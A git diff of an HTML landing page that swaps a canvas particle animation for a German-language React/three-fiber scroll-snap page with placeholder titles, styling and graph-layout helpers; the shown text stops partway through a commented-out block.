@@ -1,320 +1,1739 @@
-<html manifest="offline.appcache">
-<head></head>
-<body>
-<svg style="position: absolute; overflow: hidden" viewBox="0 0 300 900" xmlns="http://www.w3.org/2000/svg">
-    <filter id="noiseFilter">
-        <feTurbulence baseFrequency="2" numOctaves="1" stitchTiles="noStitch" type="turbulence"></feTurbulence>
-    </filter>
-    <rect filter="url(#noiseFilter)" height="100%" width="100%"></rect>
-</svg>
-<canvas id="canv"></canvas>
-<section>
-    <div class="ground">
-        <div class="ground-shadow"></div>
-    </div>
-    <div class="ball">
-        <div class="isolate">
-            <div class="ball-shadow"></div>
-            <div class="ball-light"></div>
-        </div>
-    </div>
-</section>
-<style>
-    body {
-        margin: 0;
-        top: 0;
-        left: 0;
-        display: flex;
-        overflow: hidden;
-        width: 100%;
-        height: 100%;
-        align-items: center;
-        justify-content: center;
-        /*background: radial-gradient(35% 65%, black, snow), url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHdpZHRoPSc1MDAnIGhlaWdodD0nNTAwJz48ZmlsdGVyIGlkPSdub2lzZScgeD0nMCcgeT0nMCc+PGZlVHVyYnVsZW5jZSB0eXBlPSdmcmFjdGFsTm9pc2UnIGJhc2VGcmVxdWVuY3k9JzAuNjUnIG51bU9jdGF2ZXM9JzMnIHN0aXRjaFRpbGVzPSdzdGl0Y2gnLz48ZmVCbGVuZCBtb2RlPSdzY3JlZW4nLz48L2ZpbHRlcj48cmVjdCB3aWR0aD0nNTAwJyBoZWlnaHQ9JzUwMCcgZmlsdGVyPSd1cmwoI25vaXNlKScgb3BhY2l0eT0nMC41Jy8+PC9zdmc+");*/
+<!doctype html>
+<html lang="de">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+    <title>hi.</title>
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300..700&family=Sora:wght@300..800&family=Outfit:wght@300..800&family=Plus+Jakarta+Sans:ital,wght@0,300..800;1,300..800&family=Manrope:wght@300..800&family=Inter+Tight:wght@300..800&family=Work+Sans:wght@300..800&family=Atkinson+Hyperlegible:wght@200..900&family=League+Spartan:wght@400..800&family=Bebas+Neue&display=swap"
+          rel="stylesheet">
+
+
+      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Orbitron:wght@700;900&display=swap"
+            rel="stylesheet">
+
+    <!-- Tailwind for landing -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <style>
+::-webkit-scrollbar {width: 10px;}
+::-webkit-scrollbar-thumb {background: linear-gradient(180deg, #030519 28%, rgba(1, 13, 40, 0) 100%);}
+::-webkit-scrollbar-track {background-color: #ffffff;}
+
+
+.loader {
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 100%;
+    max-width: 14.6rem;
+    margin-top: 7.3rem;
+    margin-bottom: 7.3rem;
+    }
+.loader:before, .loader:after {
+    content: "";
+    position: absolute;
+    border-radius: 50%;
+    animation-duration: 1.8s;
+    animation-iteration-count: infinite;
+    animation-timing-function: ease-in-out;
+    filter: drop-shadow(0 0 0.7555555556rem rgba(255, 255, 255, 0.75));
+    }
+.loader:before {
+    width: 100%;
+    padding-bottom: 100%;
+    box-shadow: inset 0 0 0 1.7rem #fff;
+    animation-name: pulsA;
+    }
+.loader:after {
+    width: calc(100% - 1.7rem*2);
+    padding-bottom: calc(100% - 1.7rem*2);
+    box-shadow: 0 0 0 0 #fff;
+    animation-name: pulsB;
     }
 
-    #canv {
-        top: 0;
-        width: 100%;
-        height: 100%;
-        z-index: 99999;
-        overflow: hidden;
+@keyframes pulsA {
+    0% {
+        box-shadow: inset 0 0 0 1.7rem #fff;
+        opacity: 1;
+        }
+    50%, 100% {
+        box-shadow: inset 0 0 0 0 #fff;
+        opacity: 0;
+        }
+    }
+@keyframes pulsB {
+    0%, 50% {
+        box-shadow: 0 0 0 0 #fff;
+        opacity: 0;
+        }
+    100% {
+        box-shadow: 0 0 0 1.7rem #fff;
+        opacity: 1;
+        }
     }
 
-    section {
-        position: absolute;
-        width: 250px;
-        overflow: visible;
+body,html,#root {
+    margin:                  0;
+    padding:                 0;
+    width:                   100%;
+    font-size:               16px;
+    line-height:             150%;
+    text-rendering:          optimizeLegibility;
+    font-feature-settings:   "liga", "kern", "ss01";
+    -webkit-font-smoothing:  antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    overflow-x:              hidden;
+    cursor: auto                  ;
     }
 
-    .ball {
-        position: relative;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        height: 250px;
-        width: 250px;
-        border-radius: 125px;
-        overflow: hidden;
-        z-index: 20;
-    }
+/* ensure only body scrolls */
+html, body {overflow-y: auto;}
 
-    /*
-       Isolation creates a new stacking context for mix-blend-mode.
-       See: https://developer.mozilla.org/en-US/docs/Web/CSS/isolation
-    */
-    .isolate {
-        isolation: isolate;
-        position: absolute;
-        top: 0;
-        height: 100%;
-        width: 100%;
-    }
-
-    /* Magic: using the noise SVG as a background,
-              and then upping the contrast and brightness */
-    .ball-shadow {
-        height: 100%;
-        background: radial-gradient(circle at 65% 35%, rgba(40, 40, 40, 0.3), rgba(30,30,30,0.95)), url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHdpZHRoPSc1MDAnIGhlaWdodD0nNTAwJz48ZmlsdGVyIGlkPSdub2lzZScgeD0nMCcgeT0nMCc+PGZlVHVyYnVsZW5jZSB0eXBlPSdmcmFjdGFsTm9pc2UnIGJhc2VGcmVxdWVuY3k9JzAuNjUnIG51bU9jdGF2ZXM9JzMnIHN0aXRjaFRpbGVzPSdzdGl0Y2gnLz48ZmVCbGVuZCBtb2RlPSdzY3JlZW4nLz48L2ZpbHRlcj48cmVjdCB3aWR0aD0nNTAwJyBoZWlnaHQ9JzUwMCcgZmlsdGVyPSd1cmwoI25vaXNlKScgb3BhY2l0eT0nMC41Jy8+PC9zdmc+");
-        filter: contrast(400%) brightness(900%);
-    }
-
-    .ball-light {
-        position: absolute;
-        top: 0;
-        width: 100%;
-        height: 100%;
-        background: radial-gradient(circle at 69% 40%, rgba(250,250,250,0.99), rgba(20,20,20,1));
-        mix-blend-mode: multiply;
-    }
-
-    .ground {
-        position: absolute;
-        width: 150%;
-        height: 140px;
-        bottom: -5px;
-        left: -65%;
-        transform: rotateZ(7deg);
-        mix-blend-mode: multiply;
-    }
-
-    .ground-shadow {
-        width: 95%;
-        height: 140px;
-        border-radius: 50%;
-        background: radial-gradient(ellipse at 70%, rgba(10,10,10,0.95), rgba(0, 0, 0, 0.015)), url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHdpZHRoPSc1MDAnIGhlaWdodD0nNTAwJz48ZmlsdGVyIGlkPSdub2lzZScgeD0nMCcgeT0nMCc+PGZlVHVyYnVsZW5jZSB0eXBlPSdmcmFjdGFsTm9pc2UnIGJhc2VGcmVxdWVuY3k9JzAuNjUnIG51bU9jdGF2ZXM9JzMnIHN0aXRjaFRpbGVzPSdzdGl0Y2gnLz48ZmVCbGVuZCBtb2RlPSdzY3JlZW4nLz48L2ZpbHRlcj48cmVjdCB3aWR0aD0nNTAwJyBoZWlnaHQ9JzUwMCcgZmlsdGVyPSd1cmwoI25vaXNlKScgb3BhY2l0eT0nMC41Jy8+PC9zdmc+");
-        filter: contrast(150%) brightness(600%);
-    }
-</style>
-<script>
-!function(){
-  const { mozRequestAnimationFrame, addEventListener, setTimeout, requestAnimationFrame, oRequestAnimationFrame, msRequestAnimationFrame, innerHeight, innerWidth, webkitRequestAnimationFrame, outerWidth, outerHeight } = window
-  const RGBA_REGEXP = /(\d{1,3})(?:\s?,\s?)(\d{1,3})(?:\s?,\s?)(\d{1,3})(?:\s?,\s?)(.*[^\)])/g;
-  const noop = () => {};
-
-  let c                   = document.getElementById('canv'),
-      $                   = c.getContext('2d'),
-      v                   = document.querySelector('svg'),
-      w                   = c.width = outerWidth,
-      h                   = c.height = outerHeight,
-      i = 0, j = 0, p = 0 , _p = 0, ang = 0, z = 0,
-      mouseX = 0, mouseY = 0,
-      sDisplay            = (w < h),
-      sz                  = {min: sDisplay ? 3 : 4, max: sDisplay ? 8 : 9},
-      num                 = 180,
-      sc                  = 760,
-      mTrace              = true,
-      colorStep           = 250 / num,
-      szStep = (sz.max - sz.min) / num,
-      arr                 = new Array(0)
-
-
-
-
-
-  window.requestAnimFrame = (() => requestAnimationFrame || webkitRequestAnimationFrame || mozRequestAnimationFrame || oRequestAnimationFrame || msRequestAnimationFrame || function (callback) {setTimeout(callback, 1000 / 60)})()
-  window.document.title = "Enjoy"
-
-  $.imageSmoothingEnabled = true
-  $.imageSmoothingQuality = 'high'
-  $.shadowColor = 'rgba(0,0,0, 0.35)'
-  $.shadowBlur = 1
-  $.shadowOffsetX = -1.20
-  $.shadowOffsetY = 0.50
-
-  v ? v.attributes.viewBox.value = `0 0 ${w} ${h}` : noop()
-
-  const indexMask = () =>  i + 1;
-
-  function getRandomBool () { return Math.random() >= .5 }
-  function getRandomFloat (min, max) {return Math.random() * (max - min) + min}
-  function getRandomInt (e, t) { return Math.round(Math.random() * (t - e)) + e }
-  function getRandomColor () {
-    return [getRandomInt(50, 180 + i),
-      getRandomInt(50, 180 + i),
-      getRandomInt(50, 180 + i)].join(',')
-  }
-
-  function shuffle(array) {
-    let counter = array.length;
-
-    // While there are elements in the array
-    while (counter > 0) {
-        // Pick a random index
-        let index = Math.floor(Math.random() * counter);
-
-        // Decrease counter by 1
-        counter--;
-
-        // And swap the last element with it
-        let temp = array[counter];
-        array[counter] = array[index];
-        array[index] = temp;
-    }
-
-    return array;
+#snap-container {
+  height: auto;
+  overflow: visible;
 }
 
-  function changeColor () {
-    if(sDisplay) return
-    for (let i1 = 0; i1 < num; i1++) {
-      if (getRandomBool()) continue
-      const el = arr[ i1 ]
-      const colors = intFromRGBAStr(el.col)
-      colors[ 0 ] += (mouseX / 2) * i1
-      colors[ 1 ] += (mouseY / 2) * i1
-      colors[ 2 ] += (100 / 2) * i1
 
-      colors[ 0 ] = colors[ 0 ] & 250
-      colors[ 1 ] = colors[ 1 ] & 250
-      colors[ 2 ] = colors[ 2 ] & 250
-      el.col = rgbaStrFromInt(...colors)
+/* make the root the snap scroller */
+html {
+  scroll-snap-type: y mandatory;
+  scroll-behavior: smooth;
+
+}
+
+
+#root, .R3FHeader, .section-immersive, footer {scroll-snap-align: start;}
+
+/* prevent margin-collapsing from breaking the snap */
+.section-immersive {min-height: 100vh;}
+
+
+.R3FHeader {
+  width: 100%;
+  height: 100vh; /* header height */
+  display: flex;
+  background: #030519;
+  transition: background 1s;
+  position: relative; /* anchor for ::after and Title */
+}
+
+/*#root::after {
+  pointer-events: none;
+  content: '';
+  position: absolute;
+  z-index: 1;
+  left: 0;
+  right: 0;
+  top: calc(100vh - 100px);
+  height: 100px;
+  transition: background 1s;
+  background: linear-gradient(0deg, #030519 28%, rgba(1, 13, 40, 0) 100%);
+}*/
+
+
+.TitleContainer {
+  position: absolute;
+  inset: 0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  pointer-events: none;
+  z-index: 3;
+  perspective: 600px;
+}
+
+
+.TitleHome {
+    position: relative;
+    min-width: 25vw;
+    max-width: 75vw;
+    margin: auto;
+    text-shadow: 1px 2px 2px #3d3d3d;
+    color: #ffffff;
+    text-align: center;
+    font-family: "Sora", system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-weight: 300;
+    letter-spacing: -0.055em;
+    /* word-spacing: 1rem; */
+    font-size: clamp(33px, 3vw, 55px);
+    line-height: 110%;
+    transform-style: preserve-3d;
+    backface-visibility: visible;
+    -webkit-backface-visibility: visible;
+    text-rendering: optimizeLegibility;
+    -webkit-font-smoothing: antialiased;
+    font-feature-settings: "liga", "kern", "ss01";
     }
+
+
+/* Title animation */
+.swing-in-right-fwd {
+  -webkit-animation: swing-in-right-fwd .5s cubic-bezier(1.000, 0.000, 0.000, 1.000) both;
+  animation: swing-in-right-fwd .5s cubic-bezier(1.000, 0.000, 0.000, 1.000) both
+}
+
+@-webkit-keyframes swing-in-right-fwd {
+  0% {
+    -webkit-transform: rotateY(-100deg);
+    transform: rotateY(-100deg);
+    -webkit-transform-origin: right;
+    transform-origin: right;
+    opacity: 0
   }
-  function onmousemove (e) {
-    mouseX = e.clientX;
-    mouseY = e.clientY;
-    if (!mTrace) return
-    for (let i1 = 0; i1 < num; i1++) {
-      const el = arr[ i1 ]
-      if (e.clientX - el.x < 200 && e.clientY - el.y < 200) {
-        ang = Math.atan2((el.y - e.clientY) - ((5 + i1) + Math.random() * 10), (el.x - e.clientX) -
-          ((5 + i1) + Math.random() * 9))
-        el.x += ((e.clientX + Math.cos(ang) * (270 + i1)) - el.x) / 35  //(e.clientX + (Math.random() * 2) * (el.sz * num));
-        el.y += ((e.clientY + Math.sin(ang) * (270 + i1)) - el.y) / 35 //(e.clientY + (Math.random() * 2) * (el.sz * num));
-      }
+
+  100% {
+    -webkit-transform: rotateY(0);
+    transform: rotateY(0);
+    -webkit-transform-origin: right;
+    transform-origin: right;
+    opacity: 1
+  }
+}
+
+@keyframes swing-in-right-fwd {
+  0% {
+    transform: rotateY(-100deg);
+    transform-origin: right;
+    opacity: 0
+  }
+
+  100% {
+    transform: rotateY(0);
+    transform-origin: right;
+    opacity: 1
+  }
+}
+
+#bg3d {
+  position: fixed;
+  inset: 0;
+  width: 100%;
+  height: 100vh;
+  z-index: -1;
+  pointer-events: none;
+}
+
+#snap-container {
+  height: auto !important;
+  overflow: visible !important;
+}
+
+#snap-container p{
+    font-family: Manrope,sans-serif;
+    font-kerning: auto;
+    font-weight: lighter;
+    text-rendering: optimizeLegibility;
+    text-align-last: start;
+    text-align: justify;
+    -webkit-backface-visibility: hidden;
+    -webkit-font-smoothing: antialiased;
+    font-feature-settings: "liga", "kern", "ss01";
     }
-  }
-  function rgbaStrFromInt (r, g, b, a) {
-    return `rgba(${ ++r % 251 }, ${ ++g % 251 }, ${ ++b % 251 }, ${ isNaN(a) ? getRandomFloat(.90, .99) : a })`
-  }
-  function intFromRGBAStr (rgba) {
-    const len = 3, int = new Array(len), matches = RGBA_REGEXP.exec(rgba)
-    if (!matches) {
-      for (let i = 0; i < (len); i++) int[ i ] = getRandomInt(0, 250)
-      int[ ++i ] = getRandomFloat(.01, .99)
-    } else {
-      matches.shift()
-      for (let i = 0; i < len; i++) int[ i ] = parseInt(matches[ i ])
-      int[ ++i ] = parseFloat(matches[ i ])
+
+/* Section transition effects */
+.section-immersive {
+  min-height: 100vh;
+    min-width: 100%;
+  opacity: 1;
+    backdrop-filter: blur(0px);
+  filter: blur(100px) brightness(1.08);
+  transition: opacity .77s cubic-bezier(.7, 0, .3, 1),
+              backdrop-filter .99s cubic-bezier(.7, 0, .3, 1),
+              filter .99s cubic-bezier(.7, 0, .3, 1);
+  will-change: opacity, backdrop-filter, filter;
+  z-index: 2;
+}
+
+.section-immersive.active {
+  opacity: 1;
+  filter: blur(0) brightness(1);
+    backdrop-filter: blur(100px);
+}
+
+/* Glassy container */
+.glass {
+  background: rgba(255, 255, 255, 0.15);
+  backdrop-filter: blur(3px) saturate(112%);
+}
+
+/* Burger menu */
+.burger {
+    position:        fixed;
+    top:             4rem;
+    right:           4rem;
+    z-index:         60;
+    width:           48px;
+    height:          48px;
+    display:         flex;
+    flex-direction:  column;
+    justify-content: center;
+    align-items:     center;
+    border-radius:   50%;
+    background:      none;
+    border:          none;
+    transition:      .77s cubic-bezier(.7, 0, .3, 1), filter .77s ease-in-out;
+    cursor:          pointer;
     }
-    return int
+
+.burger-bar {
+    width:         26px;
+    height:        3px;
+    background:    #FFFFFF;
+    margin:        4px 0;
+    border-radius: 0;
+    transition:    .77s cubic-bezier(.7, 0, .3, 1), filter .77s ease-in-out;
+    filter:        none;
+    }
+
+
+@keyframes breathe {
+    0%   { transform: scaleX(1) rotate(0deg); opacity: 1; }
+    25%  { transform: scaleX(1.18) rotate(1deg); opacity: 0.95; }
+    50%  { transform: scaleX(1) rotate(0deg); opacity: 1; }
+    75%  { transform: scaleX(0.82) rotate(-1deg); opacity: 0.95; }
+    100% { transform: scaleX(1) rotate(0deg); opacity: 1; }
+    }
+
+.burger:not(.open):hover .bar1{
+    animation: breathe 2s ease-in-out infinite;
+    }
+.burger:not(.open):hover .bar2 {
+    animation: breathe 2s ease-in-out infinite 0.2s;
+    }
+.burger:not(.open):hover .bar3 {
+    animation: breathe 2s ease-in-out infinite 0.4s;
+    }
+
+
+.burger.open .bar1 {
+  transform: rotate(45deg) translate(6px, 6px);
+}
+
+.burger.open .bar2 {
+  opacity: 0;
+}
+
+.burger.open .bar3 {
+  transform: rotate(-45deg) translate(6px, -6px);
+}
+
+/* Navigation overlay */
+#nav-overlay {
+  position: fixed;
+  inset: 0;
+  z-index: 55;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  /*background: radial-gradient(rgb(3 5 25), #000);*/
+  backdrop-filter: blur(24px) saturate(60%);
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity .33s, backdrop-filter .33s;
+}
+
+#nav-overlay.open {
+  opacity: 1;
+  pointer-events: all;
+}
+
+#nav-overlay ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+
+#nav-overlay li {
+  margin: 2.5rem 0;
+}
+
+#nav-overlay a {
+    font-family: 'Atkinson Hyperlegible', 'Inter', Arial, sans-serif;
+    font-size: 2.5vw;
+    color: #FFFFFF;
+    text-decoration: none;
+    letter-spacing: 0.09em;
+    font-weight: 300;
+    transition: font-weight .177s linear(0 0%, 0.21 31.79%, 0.43 70.7%, 0.99 98.26%), letter-spacing .12s linear;
+}
+
+#nav-overlay a:hover, #nav-overlay a.active-nav {
+    font-weight: 900;
+    letter-spacing: -0.05em;
+    }
+
+/* Footer */
+footer {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  min-height: 100vh;
+  padding: 6vh 0 2vh 0;
+  gap: 2rem;
+  background: transparent;
+}
+
+.vaeora-logo-svg { max-width: 10vw; }
+
+/* Custom pointer */
+#custom-pointer {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 30px;
+  height: 30px;
+  border-radius: 40%;
+  backdrop-filter: invert(1) blur(2px) saturate(100%);
+  background: rgba(17, 17, 17, 0.0085);
+  transform: translate(-50%, -50%) scale(1);
+  pointer-events: none;
+  z-index: 1000;
+  transition: transform 0.1s ease, background 0.3s ease-in-out;
+}
+
+/* Intro overlay transition */
+#intro-overlay {
+  transition: opacity .7s, filter .7s, transform .7s;
+}
+
+#brand-left {
+    position: fixed;
+    top: 4rem;
+    left: 4rem;
+    z-index: 60;
+    line-height: 0;
+    }
+
+
+#brand-left .vaeora-wordmark { filter: none; transition: filter .77s ease-in-out; }
+#brand-left.invertV .vaeora-wordmark { filter: invert(1); }
+
+.invertMe { filter: invert(1); }
+
+/* one scroller with snapping */
+#page {
+  height: 100vh;
+  overflow-y: auto;
+  scroll-snap-type: y mandatory;
+  scroll-behavior: smooth;
+  -webkit-overflow-scrolling: touch;
+}
+
+/* snap targets */
+#root,
+.R3FHeader,
+.section-immersive,
+footer {
+  scroll-snap-align: start;
+  scroll-snap-stop: always;
+  /* forces stop on each */
+}
+
+/* ensure header + sections fill a viewport */
+#root {
+  min-height: 100vh;
+}
+
+/* parent of the header */
+.R3FHeader {
+  height: 100vh;
+}
+
+/* your header wrapper */
+.section-immersive {
+  min-height: 100vh;
+}
+
+/* kill the second scroller completely */
+html, body {
+  overflow: hidden;
+}
+
+/* body does NOT scroll */
+#snap-container {
+  height: auto;
+  overflow: visible;
+}
+
+/* remove outer margins that break snapping */
+.section-immersive {
+  margin: 0;
+}
+
+/* replace margins with padding inside */
+
+@media (max-width: 700px) {
+  .TitleHome {
+    font-size: clamp(24px, 2.5vw, 55px);
   }
 
-  if(sDisplay) v.remove();
+  .vaeora-logo-svg {
+    width: 25vw;
+    height: auto;
+}
 
-  for (i = 0; i < num; i++)
-    arr.push({
-      x: (indexMask() * getRandomInt(1, 5)) * Math.random() + indexMask(),
-      y: (indexMask() * getRandomInt(1, 5)) * Math.random() + indexMask(),
-        col: rgbaStrFromInt((Math.random()*indexMask())*getRandomInt(1,5), (Math.random()*indexMask())*getRandomInt(1,5), (Math.random()*indexMask())*getRandomInt(1,5),getRandomFloat(.95,.99)),
-        sz: ((sz.max - (szStep*indexMask())) % sz.max) - sz.min/4
-      /*col: 'rgba(' + getRandomColor() + ', ' + getRandomFloat(.95, .99) + ')',
-      sz: ((getRandomInt(sz.min, sz.max) + (num - i) / num) & 0x1e) + Math.random()*/
-    })
+  #nav-overlay a {font-size: 2rem;}
+}
+    </style>
+      <!--
+      Fonts available
 
-  arr=shuffle(arr)
+      Space Grotesk
+      Sora
+      Outfit
+      Plus Jakarta Sans
+      Manrope
+      Inter
+      Inter Tight
+      Work Sans
+      Atkinson Hyperlegible
+      League Spartan
+      Bebas Neue
+      Orbitron
 
-  var run = function () {
-    if(z > 600 && z < 9000) { z=0; arr=shuffle(arr) }
-    $.clearRect(0, 0, w, h)
-    z += 0.008 / (getRandomFloat(.0005, 6))
-    for (i = 0; i < num;) {
-      p = arr[ i++ ]
-      p.x += n(p.x / sc + z, p.y / sc) * 5.7
-      p.y += n(p.x / sc - z, p.y / sc) * 5.7
-      p.x += (w / 2 - p.x) / 70
-      p.y += (h / 2 - p.y) / 70
-      for (j = i; j < num;) {
-        _p = arr[ j++ ]
-        if (Math.sqrt((_p.x - p.x) * (_p.x - p.x) + (_p.y - p.y) * (_p.y - p.y)) < 40 + Math.random() * 7) {
-          ang = Math.atan2(_p.y - p.y, _p.x - p.x)
-          _p.x += ((p.x + Math.cos(ang) * 35) - _p.x) / 9
-          _p.y += ((p.y + Math.sin(ang) * 35) - _p.y) / 9
-        }
-        if (Math.round(p.x) === Math.round(_p.x)) {
-          _p.x +=
-            ((p.x - (p.sz + _p.sz * 2) + Math.cos(Math.atan2(_p.y - p.y, _p.x - p.x)) * 7) -
-              (_p.x - (p.sz * 2 + _p.sz * 2))) / 9
-          if ((Math.round(p.y) === Math.round(_p.y))) {
-            _p.y +=
-              ((p.y - (p.sz + _p.sz * 2) + Math.sin(Math.atan2(_p.y - p.y, _p.x - p.x)) * 7) -
-                (_p.y - (p.sz * 2 + _p.sz * 2))) / 9
+      -->
+    <!-- React/R3F import map from original ref.html -->
+    <script type="importmap">
+      {
+          "imports": {
+            "react": "https://esm.sh/react@18.2.0",
+            "react-dom/client": "https://esm.sh/react-dom@18.2.0/client",
+            "three": "https://esm.sh/three@0.158.0",
+            "@react-three/fiber": "https://esm.sh/@react-three/fiber@8.15.16?deps=react@18.2.0,react-dom@18.2.0,three@0.158.0",
+            "animejs": "https://esm.sh/animejs@3.2.1",
+            "pako": "https://esm.sh/pako@2.1.0",
+            "react-intl": "https://esm.sh/react-intl@6.6.6?deps=react@18.2.0",
+            "@react-spring/web": "https://esm.sh/@react-spring/web@9.7.3?deps=react@18.2.0,react-dom@18.2.0"
           }
         }
-      }
-      $.fillStyle = p.col
-      $.beginPath()
-      $.arc(p.x, p.y, p.sz, 0, Math.PI * 2)
-      $.fill()
+    </script>
+  </head>
+
+  <body>
+    <!--<div id="custom-pointer"></div>-->
+    <div id="intro-overlay" style="position:fixed;inset:0;z-index:110;display:flex;align-items:center;justify-content:center;background:#030519;"><div class="loader"></div></div>
+     <div id="page">
+      <!-- R3F header -->
+      <div id="root"></div>
+    </div>
+    <!-- background canvas -->
+    <script type="module">
+/* === Libs === */
+import React from 'react';
+import { createRoot } from 'react-dom/client';
+import * as THREE from 'three';
+import { Canvas, useFrame, useThree } from '@react-three/fiber';
+import anime from 'animejs';
+import { ungzip } from 'pako';
+import { IntlProvider, injectIntl } from 'react-intl';
+import { useTransition, animated } from '@react-spring/web';
+
+/* ================= Core constants / helpers ================= */
+const BASE_W = 2560,
+  BASE_H = 1361;
+const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
+const BACKG = ['#030519', '#120319', '#031419'];
+
+const ratio = () => Math.max(innerWidth / BASE_W, innerHeight / BASE_H);
+const xRatio = () => innerWidth / BASE_W;
+const yRatio = () => innerHeight / BASE_H;
+
+const NODE_PX = 1.2;
+const FOV = 75;
+const CAMERA_FAR = 5e5;
+const CAMERA_NEAR = 0.01;
+
+/* Edge-Breiten-Konfiguration:
+   - Wir speichern die gewünschte Breite in Pixeln in state.edgeWidthPx (siehe Scene).
+   - Umrechnung in Clip-Space (Shader erwartet „width“ in Clip-Koordinaten):
+     1 px ≈ 2/1080 Clip (Y wird im Shader auf 1080 „fixiert“, dadurch viewport-stabil).
+   - EDGE_PX_BASE = „dünn“, EDGE_PX_EMPH = „betont“ (Steps 3 & 6).
+*/
+const edgeClipFromPx = (px) => (px * 2.0) / 1080.0;
+const EDGE_PX_BASE = isMobile ? 14 : 18; // Grunddicke (sichtbar, aber dezent)
+const EDGE_PX_EMPH = isMobile ? 35 : 55; // betont (Steps 3 & 6)
+
+/* Minimal layouts, damit Object.keys(layouts)[…] identisch bleibt */
+const layouts = {
+  circle: { axis1: { step: 10, min: 0, max: 720, values: [0, 360] }, axis2: { step: 10, min: 0, max: 1000, values: [100, 500] }, axis3: { step: 5, min: -600, max: 600, values: [-300, 300] } },
+  grid: { axis1: { step: 10, min: -1000, max: 1000, values: [-500, 500] }, axis2: { step: 10, min: -1000, max: 1000, values: [-300, 300] }, axis3: { step: 5, min: -600, max: 600, values: [-300, 300] } },
+  forceLayout: {},
+  coral: { axis1: { step: 10, min: 0, max: 720, values: [0, 360] }, axis2: { step: 10, min: 0, max: 1000, values: [100, 500] }, axis3: { step: 5, min: -600, max: 600, values: [-300, 300] } }
+};
+
+/* layout -> link family */
+const linksKeyForLayout = l => (l === 'coral' || l === 'WDMTG') ? 'hierarchyRelation' : (l === 'forceLayout') ? 'logicLinks' : 'getLinks';
+
+const MESSAGES = {
+  'home-main-title-1': 'toller text.',
+  'home-main-title-2': 'noch mehr toller text.',
+  'home-main-title-3': 'und noch viel mehr toller text.',
+  'home-main-title-4': ' ',
+  'home-main-title-5': 'mehr toller text.',
+  'home-main-title-6': ' ',
+  'home-main-title-7': ' ',
+  'home-main-title-8': 'und ende.'
+};
+
+
+function setBG(color) {
+  const r3fHeader = document.getElementsByClassName('R3FHeader')[0]
+  const rootEl = document.getElementById('root');
+  if (rootEl) rootEl.style.background = color;
+  if (r3fHeader) r3fHeader.style.background = `linear-gradient(180deg, ${color} 28%, rgba(1,13,40,0) 100%)`;
+}
+
+function pxToWorld(px, camZ, fovDeg, viewportH) {
+  const f = Math.tan(THREE.MathUtils.degToRad(fovDeg * 0.5)) * 2;
+  return px * camZ * f / viewportH;
+}
+
+function dedupeLinks(list) {
+  const s = new Set(),
+    out = [];
+  for (const { from, to } of list || []) {
+    const a = Math.min(from, to),
+      b = Math.max(from, to),
+      k = `${a}-${b}`;
+    if (!s.has(k)) {
+      s.add(k);
+      out.push({ from: a, to: b });
     }
-    requestAnimFrame(run)
   }
-  /*** SIMPLEX PERLIN NOISE ***
-   Based on Sean McCullough's port
-   of Stefan Gustavson's java 2D SimplexNoise: https://gist.github.com/304522
-   ********************************/
-  const grd = [[1, 1], [-1, 1], [1, -1], [-1, -1], [1, 0], [-1, 0], [1, 0], [-1, 0], [0, 1], [0, -1], [0, 1], [0, -1]]
-  function n (_x, _y) {
-    var s, i, j, t, x1, y1, i1, _i, _j
-    s = (_x + _y) * 0.366
-    i = Math.floor(_x + s)
-    j = Math.floor(_y + s)
-    t = (i + j) * 0.21
-    x1 = _x - (i - t)
-    y1 = _y - (j - t)
-    i1 = x1 > y1
-    _i = i & 255
-    _j = j & 255
+  return out;
+}
 
-    return 65 * (_grd(x1, y1, (_i + _j) % 12) + _grd(x1 - i1 + 0.21, y1 - !i1 + 0.21, (_i + i1 + _j + !i1) % 12) +
-      _grd(x1 - 1 + 0.42, y1 - 1 + 0.42, (_i + 1 + _j + 1) % 12))
+function webglOK() {
+  try { const c = document.createElement('canvas'); return !!(c.getContext('webgl') || c.getContext('experimental-webgl')); } catch { return false; }
+}
+
+function TitleBase({ intl, current }) {
+  const ref = React.useRef(null);
+  const [text, setText] = React.useState("");
+
+  React.useEffect(() => {
+    setText(intl.formatMessage({ id: `home-main-title-${current}` }));
+    const el = ref.current;
+    if (!el) return;
+    // Re-trigger the CSS keyframes each time `current` changes
+    el.classList.remove("swing-in-right-fwd");
+    void el.offsetWidth; // force reflow
+    el.classList.add("swing-in-right-fwd");
+  }, [current, intl]);
+
+  return React.createElement(
+    "div",
+    { className: "TitleContainer" },
+    React.createElement("div", {
+      ref,
+      className: "TitleHome swing-in-right-fwd",
+      dangerouslySetInnerHTML: { __html: text }
+    })
+  );
+}
+
+const Title = injectIntl(TitleBase);
+
+/* ================= Title (react-spring crossfade) =================
+function TitleBase({ intl, current }) {
+  const [items, setItems] = React.useState([]);
+  React.useEffect(() => {
+    setItems({ text: intl.formatMessage({ id: `home-main-title-${current}` }), key: String(current) });
+  }, [current, intl]);
+  const transitions = useTransition(items, {
+    config: { mass: 1, tension: 140, friction: 40 },
+    trail: 1500,
+    initial: { opacity: 0, position: 'absolute', transform: 'translate3d(100px,-50%,0)' },
+    from: { opacity: 0, position: 'absolute', transform: 'translate3d(100px,-50%,0)' },
+    enter: { opacity: 1, position: 'absolute', transform: 'translate3d(0px,-50%,0)' },
